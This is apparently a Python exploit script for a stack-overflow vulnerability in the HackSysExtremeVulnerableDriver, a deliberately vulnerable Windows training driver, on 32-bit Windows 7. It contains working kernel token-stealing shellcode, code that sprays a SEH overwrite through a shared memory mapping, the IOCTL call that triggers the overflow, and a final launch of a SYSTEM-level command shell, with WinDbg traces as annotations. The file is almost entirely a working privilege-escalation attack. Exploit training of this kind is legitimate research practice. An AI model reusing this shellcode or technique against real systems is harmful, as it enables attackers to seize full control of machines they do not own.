#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ctypes import *
from ctypes.wintypes import *
import ctypes
import os
import struct
import subprocess
import sys
import time

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi
gdi32 = windll.gdi32
user32 = windll.user32

def debug_print(message):
    """ debug_prints message in terminal and debugger """
    print(message)
    kernel32.OutputDebugStringA(message + "\n")

def hexdump(ptr, num):
    """
    Hexdump memory region from User-Land

    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """
    
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)

def _get_ntoskrnl():
    """ ntoskrnl base address dump (in case for mem leak attacks) """
    array_uint64_t = (c_ulonglong * 1024)()

    ntoskrnl_addr = psapi.EnumDeviceDrivers(
        byref(array_uint64_t),      # lpImageBase
        sizeof(array_uint64_t),     # cb 
        byref(c_long())             # lpcbNeeded
    )

    return array_uint64_t[0]

def ctl_code(code):
    """ Recreate CTL_CODE macro to generate driver IOCTL """
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    return (
            (FILE_DEVICE_UNKNOWN << 16) |
            (FILE_ANY_ACCESS << 14) | 
            (code << 2) | 
            METHOD_NEITHER
        )

def _HANDLE_driver_connection():
    """ Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    return handle
        
def _ret_shellcode_buffer(shellcode):
    """ Payload memory allocation in user-land """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40
    
    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )
        
    return ptr

def _send_payload(handle, malicious_buffer_ptr, malicious_buffer_size, code):
    IO_CTL = kernel32.DeviceIoControl(
        handle,                      # hDevice
        ctl_code(code),              # dwIoControlCode
        malicious_buffer_ptr,        # lpInBuffer
        malicious_buffer_size,       # nInBufferSize
        None,                        # lpOutBuffer
        0,                           # nOutBufferSize
        byref(c_ulong()),            # lpBytesReturned
        None                         # lpOverlapped
    )

    return IO_CTL

def _ret_shellcode_x86():
    """
    ----------------------------------------------------------------------------------
    Stack frame before crash
    ----------------------------------------------------------------------------------
    0: kd> r
    eax=856117c8 ebx=978195e6 ecx=876d4d40 edx=8c001275 esi=00000000 edi=00000000
    eip=00700036 esp=981b6108 ebp=981b6148 iopl=0         nv up ei pl zr na pe nc
    cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
    ----------------------------------------------------------------------------------
    0: kd> k
     # ChildEBP RetAddr  
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    00 981b6148 82a865f4 0x700036
    01 981b616c 82aba3b5 nt!ExecuteHandler+0x24
    02 981b6200 82ac305c nt!RtlDispatchException+0xb6
    03 981b6794 82a4cdd6 nt!KiDispatchException+0x17c
    04 981b67fc 82a4cd8a nt!CommonDispatchException+0x4a
    05 981b6880 8cd2233d nt!KiExceptionExit+0x192
    06 981b6ad0 8cd2229e HEVD!TriggerBufferOverflowStackGS+0x97 [c:\\projects\\hevd\\driver\\hevd\\bufferoverflowstackgs.c @ 107] 
    07 981b6ae0 8cd210ea HEVD!BufferOverflowStackGSIoctlHandler+0x1c [c:\\projects\\hevd\\driver\\hevd\\bufferoverflowstackgs.c @ 144] 
    08 981b6afc 82a45593 HEVD!IrpDeviceIoCtlHandler+0x86 [c:\\projects\\hevd\\driver\\hevd\\hacksysextremevulnerabledriver.c @ 282] 
    09 981b6b14 82c3999f nt!IofCallDriver+0x63
    0a 981b6b34 82c3cb71 nt!IopSynchronousServiceTail+0x1f8
    0b 981b6bd0 82c833f4 nt!IopXxxControlFile+0x6aa
    0c 981b6c04 82a4c1ea nt!NtDeviceIoControlFile+0x2a
    0d 981b6c04 774870b4 nt!KiFastCallEntry+0x12a
    0e 003af334 7695a671 0x774870b4
    0f 003af360 6ad6ed1a 0x7695a671
    ----------------------------------------------------------------------------------
    0: kd> u HEVD!IrpDeviceIoCtlHandler+0x86  L30
    HEVD!IrpDeviceIoCtlHandler+0x86 [c:\\projects\\hevd\\driver\\hevd\\hacksysextremevulnerabledriver.c @ 282]:
    8cd210ea 68343ad28c      push    offset HEVD! ?? ::NNGAKEGL::`string' (8cd23a34)
    8cd210ef ebce            jmp     HEVD!IrpDeviceIoCtlHandler+0x5b (8cd210bf)
    8cd210f1 8b3504f0cd8c    mov     esi,dword ptr [HEVD!_imp__DbgPrintEx (8ccdf004)]
    8cd210f7 68683ad28c      push    offset HEVD! ?? ::NNGAKEGL::`string' (8cd23a68)
    8cd210fc 6a03            push    3
    8cd210fe 6a4d            push    4Dh
    8cd21100 ffd6            call    esi
    8cd21102 83c40c          add     esp,0Ch
    8cd21105 53              push    ebx
    <...snippet...>

    [EBX -> (HEVD! ?? ::NNGAKEGL::`string')] needs to be pushed into stack, in order to fill space for [HEVD!_imp__DbgPrintEx] function.

    ----------------------------------------------------------------------------------
    0: kd> dps esp+794 L200
    981b689c  8cd24640  HEVD! ?? ::NNGAKEGL::`string' -> [EBX] -> argument
    981b68a0  0e24d285
    981b68a4  87898330
    981b68a8  82ad3087  nt!DbgPrintEx
    981b68ac  878983a0
    981b68b0  82b3b654  nt!KiInitialPCR+0x1a54
    981b68b4  00700000  -> [shellcode spraying]
    981b68b8  00700000
    981b68bc  00700000
    <...snippet...>
    981b6ac8  1af24c55
    981b6acc  00000000
    981b6ad0  981b6ae0
    981b6ad4  8cd2229e  HEVD!BufferOverflowStackGSIoctlHandler+0x1c
    981b6ad8  00710dec
    981b6adc  00000218
    981b6ae0  981b6afc
    981b6ae4  8cd210ea  HEVD!IrpDeviceIoCtlHandler+0x86 -> [EDI] -> current stack frame
    981b6ae8  87898330
    981b6aec  878983a0
    981b6af0  878913f8
    981b6af4  8772fe10
    981b6af8  00000000
    981b6afc  981b6b14  [POP EBP] add +4 to stack frame -> [EIP] must return to [nt!IofCallDriver+0x63]
    981b6b00  82a45593  [nt!IofCallDriver+0x63] -> [ESP after POP EBP] -> return to next stack frame function 
    981b6b04  8772fe10
    981b6b08  87898330
    981b6b0c  87898330
    """

    shellcode = bytearray(
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Debug]
        #"\xCC"                         
        #---[Recover]
        "\x90" 
        "\x8b\x9c\x24\x94\x07\x00\x00"  # mov ebx, DWORD PTR [esp+0x794] -> (981b689c: 8cd24640) HEVD! ?? ::NNGAKEGL::`string' 
        "\x8b\xbc\x24\xdc\x09\x00\x00"  # mov edi, DWORD PTR [esp+0x9dc] -> (981b6ae4: 8cd210ea) HEVD!IrpDeviceIoCtlHandler+0x86
        "\x31\xc0"                      # xor eax, eax                   -> [NTSTATUS -> STATUS_SUCCESS] IrpDeviceIoCtlHandler fake result
        "\x81\xc4\xf4\x09\x00\x00"      # add esp, 0x9f4                 -> (981b6b00: 82a45593) -> nt!IofCallDriver+0x63
        "\x5d"                          # pop ebp                     
        "\xc2\x08\x00"                  # ret 0x8
    )

    return shellcode

def _exploit(code):
    """ nt-authority/SYSTEM shell """
    shellcode = _ret_shellcode_x86()
    shellcode_ptr = _ret_shellcode_buffer(shellcode)
    debug_print("\n[*] User-land shellcode allocated at: [0x{:08X}]\n".format(shellcode_ptr))
    debug_print(hexdump(shellcode_ptr, 32) + "\n")

    # map shared memory
    # https://stackoverflow.com/questions/48788549/python-ctypes-oserror-exception-access-violation-writing-0xfffffffffa1c001
    
    # global variables
    FILE_MAP_ALL_ACCESS = 0x000F001F
    INVALID_HANDLE_VALUE = -1
    PAGE_EXECUTE_READWRITE = 64
    
    FILEMAP_SIZE = 4096
    SEH_overwrite_offset = 532

    # Creating file mapping
    # https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga
    mapping_handle = kernel32.CreateFileMappingA(
                INVALID_HANDLE_VALUE,   # hFile
                0,                      # lpFileMappingAttributes
                PAGE_EXECUTE_READWRITE, # flProtect
                0,                      # dwMaximumSizeHigh
                FILEMAP_SIZE,           # dwMaximumSizeLow
                "SharedMemory"          # lpName
    )

    print("[!] Mapping object handle: [0x{:08X}]".format(mapping_handle))

    if not mapping_handle:
        debug_print("[-] Could not open file mapping object: [0x{:08X}]".format(kernel32.GetLastError()))
        return False

    # Mapping it to current process space
    # https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile
    SharedMappedMemoryAddress = kernel32.MapViewOfFile(
                mapping_handle,         # hFileMappingObject
                FILE_MAP_ALL_ACCESS,    # dwDesiredAccess
                0,                      # dwFileOffsetHigh
                0,                      # dwFileOffsetLow
                FILEMAP_SIZE            # dwNumberOfBytesToMap
    )

    debug_print("[*] SharedMappedMemoryAddress: [0x{:08X}]".format(SharedMappedMemoryAddress))

    if not SharedMappedMemoryAddress:
        debug_print("[-] Could not map view of file: [0x{:08X}]".format(GetLastError()))
        CloseHandle(mapping_handle)
        return False    

    SuitableMemoryForBuffer = SharedMappedMemoryAddress + (FILEMAP_SIZE - SEH_overwrite_offset)
    debug_print("[*] SuitableMemoryForBuffer address: [0x{:08X}]\n".format(SuitableMemoryForBuffer))

    memset(SharedMappedMemoryAddress, 0x41, FILEMAP_SIZE)
    debug_print("[!] MapViewOfFile buffer filled with: [0x{:08X}] bytes".format(FILEMAP_SIZE))

    # spraying stack frame with shellcode address
    i = 0
    while i < SEH_overwrite_offset:
        memmove(SuitableMemoryForBuffer+i, struct.pack("<I", shellcode_ptr), 4)
        i += 4
    
    # driver file handler 
    hFile = _HANDLE_driver_connection()       
    debug_print("\n[+] Driver connection initilized!\n")
    raw_input("[*] Press any key to send payload...")

    """
    python2.7 id() -> Commom issues and how to deal with it
    
    0: kd> dc 0x1760130
    .---------------------------------------------------------------.
    |01760130  00000001 6a7ae328 00000200 ffffffff  ....(Ã£zj....Ã¿Ã¿Ã¿Ã¿| -> Additional bytes when utilizing python id() function
    |                  .--------------------------------------------'
    |01760140  00000000|41414141 41414141 41414141  ....AAAAAAAAAAAA
    '------------------'
    01760150  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760160  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760170  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760180  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760190  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    017601a0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    ---------------------------------------------------------------
    0: kd> dc 0x1760130+0x14
    01760144  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760154  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760164  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760174  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA  -> Without additional bytes
    01760184  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    01760194  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    017601a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    017601b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    
    """
    
    # send custom payload -> junk + <shellcode_ptr> 
    _send_payload(
        hFile,
        SuitableMemoryForBuffer,
        SEH_overwrite_offset + 4, #  unbound size (overflow) -> Trigger Spoofed SEH/NextSEH
        code
    )


    """
    # debug
    payload_ptr = "A" * 532

    _send_payload(
        hFile,
        id(payload_ptr) + 0x14,
        SEH_overwrite_offset, # unbound size unchecked (overflow) -> Trigger Spoofed SEH/NextSEH
        code
    )
    """

    debug_print("[+] Exploit Payload Sent!")
    debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")
    
    os.system("start cmd.exe") # get SYSTEM shell
        
if __name__ == "__main__":
    """
    References:
        * - https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Bypassing%20Stack%20Cookies,%20SafeSeh,%20HW%20DEP%20and%20ASLR.pdf
        * - https://klue.github.io/blog/2017/09/hevd_stack_gs/
        * - https://github.com/Cn33liz/HSEVD-StackCookieBypass/blob/master/HS-StackOverflowGS/HS-StackOverflowGS.c

    IOCTL to trigger the stack overflow GS vulnerability:
        * - https://github.com/HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
    
    WINDBG:
        .sympath c:\\symbols;c:\\hevd
        .reload /f *.*
        ed nt!Kd_Default_Mask 8
        .load pykd
        !py -g winext\\TWindbg\\TWindbg.py
        lm m HEVD
        TWindbg
        bp HEVD!TriggerBufferOverflowStackGS+0x92
        g
    
    Windows Build:
        0: kd> vertarget
        Windows 7 Kernel Version 7601 (Service Pack 1) MP (4 procs) Free x86 compatible
        Product: WinNt, suite: TerminalServer SingleUserTS
        Built by: 7601.17514.x86fre.win7sp1_rtm.101119-1850
        Machine Name:
        Kernel base = 0x82a0e000 PsLoadedModuleList = 0x82b58850
        Debug session time: Sat May 22 15:32:12.285 2021 (UTC - 3:00)
        System Uptime: 0 days 0:01:36.251
    """

    code = 0x801    # HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS(0x801)
    _exploit(code)
